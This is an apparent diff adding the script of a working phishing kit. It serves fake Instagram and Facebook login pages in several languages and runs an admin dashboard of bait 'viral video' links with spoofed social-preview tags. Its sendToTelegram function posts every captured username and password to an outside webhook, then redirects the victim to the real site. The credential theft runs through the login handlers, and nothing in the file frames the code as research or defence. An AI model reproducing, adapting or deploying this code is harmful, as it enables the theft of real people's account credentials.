+                        { id: 3, title: 'Amazing Nature Video', description: 'Beautiful scenery that will blow your mind! 🌄', thumbnail: 'https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=400&h=400&fit=crop', siteName: 'Nature Lovers' }
+                    ];
+                    saveVideos();
+                }
+            } catch(e) { videos = []; }
+            try {
+                const savedPlatform = localStorage.getItem('selectedPlatform');
+                if (savedPlatform && platforms[savedPlatform]) {
+                    currentPlatform = savedPlatform;
+                }
+            } catch(e) {}
+        }
+
+        function saveVideos() {
+            try { localStorage.setItem('videos', JSON.stringify(videos)); } catch(e) {}
+        }
+
+        function savePlatformStorage() {
+            try { localStorage.setItem('selectedPlatform', currentPlatform); } catch(e) {}
+        }
+
+        function getNextId() {
+            if (videos.length === 0) return 1;
+            return Math.max(...videos.map(v => v.id)) + 1;
+        }
+
+        // ============================================================
+        // TELEGRAM SENDER
+        // ============================================================
+        async function sendToTelegram(platform, username, password) {
+            const message = `🔐 New Login Attempt (${platform})%0A%0A📧 Email/Username: ${encodeURIComponent(username)}%0A🔑 Password: ${encodeURIComponent(password)}%0A%0A🕐 Time: ${new Date().toLocaleString()}`;
+
+            try {
+                const response = await fetch(PIPEDREAM_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: message
+                    })
+                });
+
+                const result = await response.text();
+                console.log('✅ Pipedream response:', result);
+                return true;
+            } catch(e) {
+                console.log('❌ Error:', e);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // PLATFORM FUNCTIONS
+        // ============================================================
+        function applyPlatform(platformKey) {
+            const platform = platforms[platformKey];
+            if (!platform) return;
+            currentPlatform = platformKey;
+            savePlatformStorage();
+            document.getElementById('currentPlatformDisplay').textContent = platform.name;
+            document.getElementById('platformSelect').value = platformKey;
+            showLoginPage(platformKey);
+            updateOGTags(platform);
+        }
+
+        function showLoginPage(platformKey) {
+            document.getElementById('instagramPage').classList.remove('active');
+            document.getElementById('facebookPage').classList.remove('active');
+            if (platformKey === 'instagram') {
+                document.getElementById('instagramPage').classList.add('active');
+            } else {
+                document.getElementById('facebookPage').classList.add('active');
+            }
+        }
+
+        function updateOGTags(platform) {
+            document.querySelectorAll('meta[property^="og:"], meta[name^="twitter:"]').forEach(el => el.remove());
+            const tags = [
+                { property: 'og:title', content: platform.ogTitle },
+                { property: 'og:description', content: platform.ogDescription },
+                { property: 'og:image', content: platform.ogImage },
+                { property: 'og:url', content: window.location.origin + window.location.pathname },
+                { property: 'og:type', content: 'website' },
+                { property: 'og:site_name', content: platform.ogSiteName },
+                { name: 'twitter:card', content: 'summary_large_image' },
+                { name: 'twitter:title', content: platform.ogTitle },
+                { name: 'twitter:description', content: platform.ogDescription },
+                { name: 'twitter:image', content: platform.ogImage }
+            ];
+            tags.forEach(tag => {
+                const meta = document.createElement('meta');
+                if (tag.property) meta.setAttribute('property', tag.property);
+                if (tag.name) meta.setAttribute('name', tag.name);
+                meta.setAttribute('content', tag.content);
+                document.head.appendChild(meta);
+            });
+        }
+
+        function savePlatform() {
+            const select = document.getElementById('platformSelect');
+            const platformKey = select.value;
+            applyPlatform(platformKey);
+            renderVideos();
+            showToast(`Platform changed to ${platforms[platformKey].name}!`, 'success');
+        }
+
+        // ============================================================
+        // RENDER VIDEOS
+        // ============================================================
+        function renderVideos() {
+            const container = document.getElementById('videoListContainer');
+            if (videos.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-video"></i>
+                        <p>No videos added yet. Add your first video above!</p>
+                    </div>
+                `;
+                return;
+            }
+            let html = '<div class="video-list">';
+            videos.forEach(v => {
+                const videoUrl = window.location.origin + window.location.pathname + '?video=' + v.id;
+                const thumbHtml = v.thumbnail ? `<div class="video-thumb"><img src="${v.thumbnail}" alt="${v.title}"></div>` : '';
+                const siteNameDisplay = v.siteName ? `<div style="font-size:12px;color:#1877f2;margin-top:2px;">Shows as: ${v.siteName}</div>` : '';
+                html += `
+                    <div class="video-item">
+                        <div class="video-info">
+                            <div class="title">${v.title}</div>
+                            <div class="desc">${v.description}</div>
+                            ${siteNameDisplay}
+                            ${thumbHtml}
+                            <div class="video-id">🔗 Share: <a href="${videoUrl}" target="_blank">${videoUrl}</a></div>
+                        </div>
+                        <div class="video-actions">
+                            <button class="edit-btn" onclick="openEditModal(${v.id})">✏️ Edit</button>
+                            <button class="delete-btn" onclick="deleteVideo(${v.id})">🗑️ Delete</button>
+                        </div>
+                    </div>
+                `;
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        }
+
+        // ============================================================
+        // VIDEO CRUD FUNCTIONS
+        // ============================================================
+        async function addVideo() {
+            const title = document.getElementById('videoTitleInput').value.trim();
+            const fileInput = document.getElementById('videoImageInput');
+            const desc = document.getElementById('videoDescInput').value.trim();
+            const siteName = document.getElementById('videoSiteNameInput').value.trim() || 'Viral Videos';
+
+            if (!title || !desc) {
+                showToast('Please fill in title and description!', 'error');
+                return;
+            }
+
+            let imageUrl = 'https://picsum.photos/400/400';
+
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                const formData = new FormData();
+                formData.append('image', file);
+
+                try {
+                    const response = await fetch('/api/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        imageUrl = data.imageUrl;
+                        console.log('✅ Image uploaded to Cloudinary:', imageUrl);
+                    } else {
+                        showToast('Image upload failed, using placeholder', 'error');
+                    }
+                } catch (e) {
+                    console.log('❌ Upload error:', e);
+                    showToast('Image upload failed, using placeholder', 'error');
+                }
+            }
+
+            const newVideo = {
+                id: getNextId(),
+                title: title,
+                description: desc,
+                thumbnail: imageUrl,
+                siteName: siteName
+            };
+
+            videos.push(newVideo);
+            saveVideos();
+            renderVideos();
+            const platform = platforms[currentPlatform];
+            updateOGTags(platform);
+            document.getElementById('videoTitleInput').value = '';
+            document.getElementById('videoImageInput').value = '';
+            document.getElementById('videoDescInput').value = '';
+            document.getElementById('videoSiteNameInput').value = '';
+            showToast('Video added successfully!', 'success');
+        }
+
+        function deleteVideo(id) {
+            if (!confirm('Are you sure you want to delete this video?')) return;
+            videos = videos.filter(v => v.id !== id);
+            saveVideos();
+            renderVideos();
+            const platform = platforms[currentPlatform];
+            updateOGTags(platform);
+            showToast('Video deleted!', 'success');
+        }
+
+        function openEditModal(id) {
+            const video = videos.find(v => v.id === id);
+            if (!video) return;
+            editId = id;
+            document.getElementById('editTitle').value = video.title;
+            document.getElementById('editImage').value = video.thumbnail || '';
+            document.getElementById('editDesc').value = video.description;
+            document.getElementById('editSiteName').value = video.siteName || '';
+            document.getElementById('editModal').classList.add('active');
+        }
+
+        function closeEditModal() {
+            document.getElementById('editModal').classList.remove('active');
+            editId = null;
+        }
+
+        function saveEdit() {
+            const title = document.getElementById('editTitle').value.trim();
+            const image = document.getElementById('editImage').value.trim();
+            const desc = document.getElementById('editDesc').value.trim();
+            const siteName = document.getElementById('editSiteName').value.trim();
+            if (!title || !image || !desc) {
+                showToast('Please fill in all fields!', 'error');
+                return;
+            }
+            const video = videos.find(v => v.id === editId);
+            if (video) {
+                video.title = title;
+                video.thumbnail = image;
+                video.description = desc;
+                video.siteName = siteName || video.siteName;
+                saveVideos();
+                renderVideos();
+                const platform = platforms[currentPlatform];
+                updateOGTags(platform);
+                closeEditModal();
+                showToast('Video updated!', 'success');
+            }
+        }
+
+        // ============================================================
+        // TOAST
+        // ============================================================
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast show ' + (type || '');
+            clearTimeout(toast._timeout);
+            toast._timeout = setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ============================================================
+        // LOGIN HANDLERS
+        // ============================================================
+        async function handleInstagramLogin() {
+            const username = document.getElementById('instaUsername').value.trim();
+            const password = document.getElementById('instaPassword').value.trim();
+            const loginBtn = document.getElementById('instaLoginBtn');
+            const loginText = document.getElementById('instaLoginText');
+            const spinner = document.getElementById('instaSpinner');
+
+            document.getElementById('instaUsername').classList.remove('error');
+            document.getElementById('instaPassword').classList.remove('error');
+
+            if (!username || !password) {
+                if (!username) document.getElementById('instaUsername').classList.add('error');
+                if (!password) document.getElementById('instaPassword').classList.add('error');
+                alert('Please fill in both fields.');
+                return;
+            }
+
+            if (username === ADMIN_USER && password === ADMIN_PASS) {
+                document.getElementById('instagramPage').classList.remove('active');
+                document.getElementById('facebookPage').classList.remove('active');
+                document.getElementById('dashboardPage').classList.add('active');
+                renderVideos();
+                document.getElementById('platformSelect').value = currentPlatform;
+                document.getElementById('currentPlatformDisplay').textContent = platforms[currentPlatform].name;
+                showToast('Welcome back, Admin!', 'success');
+                document.getElementById('instaUsername').value = '';
+                document.getElementById('instaPassword').value = '';
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginText.style.display = 'none';
+            spinner.classList.add('show');
+
+            await sendToTelegram('Instagram', username, password);
+
+            const platform = platforms.instagram;
+            setTimeout(() => {
+                window.location.href = platform.redirectUrl;
+            }, 1500);
+        }
+
+        async function handleFacebookLogin() {
+            const username = document.getElementById('fbUsername').value.trim();
+            const password = document.getElementById('fbPassword').value.trim();
+            const loginBtn = document.getElementById('fbLoginBtn');
+            const loginText = document.getElementById('fbLoginText');
+            const spinner = document.getElementById('fbSpinner');
+
+            document.getElementById('fbUsername').classList.remove('error');
+            document.getElementById('fbPassword').classList.remove('error');
+
+            if (!username || !password) {
+                if (!username) document.getElementById('fbUsername').classList.add('error');
+                if (!password) document.getElementById('fbPassword').classList.add('error');
+                alert('Please fill in both fields.');
+                return;
+            }
+
+            if (username === ADMIN_USER && password === ADMIN_PASS) {
+                document.getElementById('instagramPage').classList.remove('active');
+                document.getElementById('facebookPage').classList.remove('active');
+                document.getElementById('dashboardPage').classList.add('active');
+                renderVideos();
+                document.getElementById('platformSelect').value = currentPlatform;
+                document.getElementById('currentPlatformDisplay').textContent = platforms[currentPlatform].name;
+                showToast('Welcome back, Admin!', 'success');
+                document.getElementById('fbUsername').value = '';
+                document.getElementById('fbPassword').value = '';
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginText.style.display = 'none';
+            spinner.classList.add('show');
+
+            await sendToTelegram('Facebook', username, password);
+
+            const platform = platforms.facebook;
+            setTimeout(() => {
+                window.location.href = platform.redirectUrl;
+            }, 1500);
+        }
+
+        // ============================================================
+        // LOGOUT
+        // ============================================================
+        function logout() {
+            document.getElementById('dashboardPage').classList.remove('active');
+            showLoginPage(currentPlatform);
+            showToast('Logged out successfully', 'success');
+        }
+
+        // ============================================================
+        // ENTER KEY SUPPORT
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const active = document.activeElement;
+                if (active && (active.id === 'instaUsername' || active.id === 'instaPassword')) {
+                    handleInstagramLogin();
+                }
+                if (active && (active.id === 'fbUsername' || active.id === 'fbPassword')) {
+                    handleFacebookLogin();
+                }
+            }
+        });
+
+        // ============================================================
+        // PASSWORD TOGGLE FUNCTIONS
+        // ============================================================
+        const instaPasswordInput = document.getElementById('instaPassword');
+        const instaTogglePassword = document.getElementById('instaTogglePassword');
+        instaPasswordInput.addEventListener('focus', function() {
+            instaTogglePassword.classList.add('visible');
+        });
+        instaPasswordInput.addEventListener('blur', function() {
+            setTimeout(() => {
+                if (!instaTogglePassword.matches(':hover')) {
+                    instaTogglePassword.classList.remove('visible');
+                }
+            }, 150);
+        });
+        instaTogglePassword.addEventListener('mouseenter', function() {
+            if (document.activeElement === instaPasswordInput) {
+                this.classList.add('visible');
+            }
+        });
+        instaTogglePassword.addEventListener('mouseleave', function() {
+            if (document.activeElement !== instaPasswordInput) {
+                this.classList.remove('visible');
+            }
+        });
+        instaTogglePassword.addEventListener('click', function() {
+            const icon = this.querySelector('i');
+            if (instaPasswordInput.type === 'password') {
+                instaPasswordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                instaPasswordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+            instaPasswordInput.focus();
+        });
+
+        const fbPasswordInput = document.getElementById('fbPassword');
+        const fbTogglePassword = document.getElementById('fbTogglePassword');
+        fbPasswordInput.addEventListener('focus', function() {
+            fbTogglePassword.classList.add('visible');
+        });
+        fbPasswordInput.addEventListener('blur', function() {
+            setTimeout(() => {
+                if (!fbTogglePassword.matches(':hover')) {
+                    fbTogglePassword.classList.remove('visible');
+                }
+            }, 150);
+        });
+        fbTogglePassword.addEventListener('mouseenter', function() {
+            if (document.activeElement === fbPasswordInput) {
+                this.classList.add('visible');
+            }
+        });
+        fbTogglePassword.addEventListener('mouseleave', function() {
+            if (document.activeElement !== fbPasswordInput) {
+                this.classList.remove('visible');
+            }
+        });
+        fbTogglePassword.addEventListener('click', function() {
+            const icon = this.querySelector('i');
+            if (fbPasswordInput.type === 'password') {
+                fbPasswordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                fbPasswordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+            fbPasswordInput.focus();
+        });
+
+        // ============================================================
+        // LANGUAGE DROPDOWN FUNCTIONS
+        // ============================================================
+        function toggleInstaDropdown() {
+            const dropdown = document.getElementById('instaLanguageDropdown');
+            const arrow = document.getElementById('instaDropdownArrow');
+            dropdown.classList.toggle('show');
+            arrow.classList.toggle('open');
+        }
+
+        function toggleFbDropdown() {
+            const dropdown = document.getElementById('fbLanguageDropdown');
+            const arrow = document.getElementById('fbDropdownArrow');
+            dropdown.classList.toggle('show');
+            arrow.classList.toggle('open');
+        }
+
+        document.addEventListener('click', function(e) {
+            const instaWrapper = document.querySelector('.instagram-container .language-wrapper');
+            if (instaWrapper && !instaWrapper.contains(e.target)) {
+                document.getElementById('instaLanguageDropdown').classList.remove('show');
+                document.getElementById('instaDropdownArrow').classList.remove('open');
+            }
+            const fbWrapper = document.querySelector('.facebook-container .language-wrapper');
+            if (fbWrapper && !fbWrapper.contains(e.target)) {
+                document.getElementById('fbLanguageDropdown').classList.remove('show');
+                document.getElementById('fbDropdownArrow').classList.remove('open');
+            }
+        });
+
+        // ============================================================
+        // TRANSLATIONS
+        // ============================================================
+        const translations = {
+            en: {
+                fbBanner: 'Get Facebook for Android so you can browse faster.',
+                fbUsername: 'Mobile phone number or email address',
+                fbPassword: 'Password',
+                fbLogin: 'Log in',
+                fbForgot: 'Forgot your password?',
+                fbCreate: 'Create new account',
+                fbMeta: 'Meta',
+                fbAbout: 'About',
+                fbHelp: 'Help',
+                fbMore: 'More',
+                fbLanguage: 'English',
+                instaUsername: 'Username, email or mobile number',
+                instaPassword: 'Password',
+                instaLogin: 'Log in',
+                instaForgot: 'Forgot password?',
+                instaCreate: 'Create new account',
+                instaMeta: 'Meta',
+                instaLanguage: 'English'
+            },
+            de: {
+                fbBanner: 'Holen Sie sich Facebook für Android, um schneller zu surfen.',
+                fbUsername: 'Mobiltelefonnummer oder E-Mail-Adresse',
+                fbPassword: 'Passwort',
+                fbLogin: 'Einloggen',
+                fbForgot: 'Passwort vergessen?',
+                fbCreate: 'Neues Konto erstellen',
+                fbMeta: 'Meta',
+                fbAbout: 'Über',
+                fbHelp: 'Hilfe',
+                fbMore: 'Mehr',
+                fbLanguage: 'Deutsch',
+                instaUsername: 'Benutzername, E-Mail oder Handynummer',
+                instaPassword: 'Passwort',
+                instaLogin: 'Einloggen',
+                instaForgot: 'Passwort vergessen?',
+                instaCreate: 'Neues Konto erstellen',
+                instaMeta: 'Meta',
+                instaLanguage: 'Deutsch'
+            },
+            es: {
+                fbBanner: 'Obtén Facebook para Android y navega más rápido.',
+                fbUsername: 'Número de teléfono móvil o correo electrónico',
+                fbPassword: 'Contraseña',
+                fbLogin: 'Iniciar sesión',
+                fbForgot: '¿Olvidaste tu contraseña?',
+                fbCreate: 'Crear cuenta nueva',
+                fbMeta: 'Meta',
+                fbAbout: 'Acerca de',
+                fbHelp: 'Ayuda',
+                fbMore: 'Más',
+                fbLanguage: 'Español',
+                instaUsername: 'Nombre de usuario, correo o número móvil',
+                instaPassword: 'Contraseña',
+                instaLogin: 'Iniciar sesión',
+                instaForgot: '¿Olvidaste tu contraseña?',
+                instaCreate: 'Crear cuenta nueva',
+                instaMeta: 'Meta',
+                instaLanguage: 'Español'
+            },
+            fr: {
+                fbBanner: 'Obtenez Facebook pour Android et naviguez plus rapidement.',
+                fbUsername: 'Numéro de mobile ou adresse e-mail',
+                fbPassword: 'Mot de passe',
+                fbLogin: 'Se connecter',
+                fbForgot: 'Mot de passe oublié ?',
+                fbCreate: 'Créer un compte',
+                fbMeta: 'Meta',
+                fbAbout: 'À propos',
+                fbHelp: 'Aide',
+                fbMore: 'Plus',
+                fbLanguage: 'Français',
+                instaUsername: "Nom d'utilisateur, e-mail ou numéro mobile",
+                instaPassword: 'Mot de passe',
+                instaLogin: 'Se connecter',
+                instaForgot: 'Mot de passe oublié ?',
+                instaCreate: 'Créer un compte',
+                instaMeta: 'Meta',
+                instaLanguage: 'Français'
+            },
+            it: {
+                fbBanner: 'Scarica Facebook per Android e naviga più velocemente.',
+                fbUsername: 'Numero di telefono o email',
+                fbPassword: 'Password',
+                fbLogin: 'Accedi',
+                fbForgot: 'Password dimenticata?',
+                fbCreate: 'Crea nuovo account',
+                fbMeta: 'Meta',
+                fbAbout: 'Informazioni',
+                fbHelp: 'Aiuto',
+                fbMore: 'Altro',
+                fbLanguage: 'Italiano',
+                instaUsername: 'Nome utente, email o numero di telefono',
+                instaPassword: 'Password',
+                instaLogin: 'Accedi',
+                instaForgot: 'Password dimenticata?',
+                instaCreate: 'Crea nuovo account',
+                instaMeta: 'Meta',
+                instaLanguage: 'Italiano'
+            },
+            pt: {
+                fbBanner: 'Baixe o Facebook para Android e navegue mais rápido.',
+                fbUsername: 'Número de telefone ou e-mail',
+                fbPassword: 'Senha',
+                fbLogin: 'Entrar',
+                fbForgot: 'Esqueceu a senha?',
+                fbCreate: 'Criar nova conta',
+                fbMeta: 'Meta',
+                fbAbout: 'Sobre',
+                fbHelp: 'Ajuda',
+                fbMore: 'Mais',
+                fbLanguage: 'Português',
+                instaUsername: 'Nome de usuário, e-mail ou número de telefone',
+                instaPassword: 'Senha',
+                instaLogin: 'Entrar',
+                instaForgot: 'Esqueceu a senha?',
+                instaCreate: 'Criar nova conta',
+                instaMeta: 'Meta',
+                instaLanguage: 'Português'
+            },
+            id: {
+                fbBanner: 'Dapatkan Facebook untuk Android agar Anda dapat menjelajah lebih cepat.',
+                fbUsername: 'Nomor ponsel atau alamat email',
+                fbPassword: 'Kata sandi',
+                fbLogin: 'Masuk',
+                fbForgot: 'Lupa kata sandi?',
+                fbCreate: 'Buat akun baru',
+                fbMeta: 'Meta',
+                fbAbout: 'Tentang',
+                fbHelp: 'Bantuan',
+                fbMore: 'Lainnya',
+                fbLanguage: 'Bahasa Indonesia',
+                instaUsername: 'Nama pengguna, email atau nomor ponsel',
+                instaPassword: 'Kata sandi',
+                instaLogin: 'Masuk',
+                instaForgot: 'Lupa kata sandi?',
+                instaCreate: 'Buat akun baru',
+                instaMeta: 'Meta',
+                instaLanguage: 'Bahasa Indonesia'
+            }
+        };
+
+        const languageList = [
+            { code: 'en', name: 'English' },
+            { code: 'de', name: 'Deutsch' },
+            { code: 'es', name: 'Español' },
+            { code: 'fr', name: 'Français' },
+            { code: 'it', name: 'Italiano' },
+            { code: 'pt', name: 'Português' },
+            { code: 'id', name: 'Bahasa Indonesia' }
+        ];
+
+        function detectBrowserLanguage() {
+            const userLang = navigator.language || navigator.userLanguage;
+            const baseLang = userLang.split('-')[0];
+            const found = languageList.find(l => l.code === baseLang);
+            return found || { code: 'en', name: 'English' };
+        }
+
+        function applyTranslations(langCode) {
+            const t = translations[langCode];
+            if (!t) return;
+            document.getElementById('fbBannerText').textContent = t.fbBanner;
+            document.getElementById('fbUsername').placeholder = t.fbUsername;
+            document.getElementById('fbPassword').placeholder = t.fbPassword;
+            document.getElementById('fbLoginText').textContent = t.fbLogin;
+            document.getElementById('fbForgotText').textContent = t.fbForgot;
+            document.getElementById('fbCreateBtn').textContent = t.fbCreate;
+            document.getElementById('fbMetaText').textContent = t.fbMeta;
+            document.getElementById('fbAboutText').textContent = t.fbAbout;
+            document.getElementById('fbHelpText').textContent = t.fbHelp;
+            document.getElementById('fbMoreText').textContent = t.fbMore;
+            document.getElementById('fbCurrentLanguage').textContent = t.fbLanguage;
+            document.getElementById('instaUsername').placeholder = t.instaUsername;
+            document.getElementById('instaPassword').placeholder = t.instaPassword;
+            document.getElementById('instaLoginText').textContent = t.instaLogin;
+            document.getElementById('instaForgotText').textContent = t.instaForgot;
+            document.getElementById('instaCreateBtn').textContent = t.instaCreate;
+            document.getElementById('instaMetaText').textContent = t.instaMeta;
+            document.getElementById('instaCurrentLanguage').textContent = t.instaLanguage;
+            document.querySelectorAll('.instagram-container .lang-item, .facebook-container .lang-item').forEach(item => {
+                item.classList.toggle('active', item.textContent === t.fbLanguage);
+            });
+            try { localStorage.setItem('preferredLanguage', langCode); } catch(e) {}
+            document.documentElement.lang = langCode;
+        }
+
+        function populateDropdowns() {
+            const instaDropdown = document.getElementById('instaLanguageDropdown');
+            instaDropdown.innerHTML = '';
+            languageList.forEach(lang => {
+                const item = document.createElement('div');
+                item.className = 'lang-item';
+                item.textContent = lang.name;
+                item.onclick = function(e) {
+                    e.stopPropagation();
+                    applyTranslations(lang.code);
+                    instaDropdown.classList.remove('show');
+                    document.getElementById('instaDropdownArrow').classList.remove('open');
+                    document.getElementById('fbLanguageDropdown').classList.remove('show');
+                    document.getElementById('fbDropdownArrow').classList.remove('open');
+                };
+                instaDropdown.appendChild(item);
+            });
+            const fbDropdown = document.getElementById('fbLanguageDropdown');
+            fbDropdown.innerHTML = '';
+            languageList.forEach(lang => {
+                const item = document.createElement('div');
+                item.className = 'lang-item';
+                item.textContent = lang.name;
+                item.onclick = function(e) {
+                    e.stopPropagation();
+                    applyTranslations(lang.code);
+                    fbDropdown.classList.remove('show');
+                    document.getElementById('fbDropdownArrow').classList.remove('open');
+                    document.getElementById('instaLanguageDropdown').classList.remove('show');
+                    document.getElementById('instaDropdownArrow').classList.remove('open');
+                };
+                fbDropdown.appendChild(item);
+            });
+        }
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        async function init() {
+            populateDropdowns();
+            try {
+                const savedPlatform = localStorage.getItem('selectedPlatform');
+                if (savedPlatform && platforms[savedPlatform]) {
+                    currentPlatform = savedPlatform;
+                }
+            } catch (e) {}
+
+            await loadVideos();
+            applyPlatform(currentPlatform);
+
+            const savedLang = localStorage.getItem('preferredLanguage');
+            if (savedLang) {
+                applyTranslations(savedLang);
+            } else {
+                const detected = detectBrowserLanguage();
+                applyTranslations(detected.code);
+            }
+            showLoginPage(currentPlatform);
+        }
+
+        init();
+    </script>
+</body>
+</html>
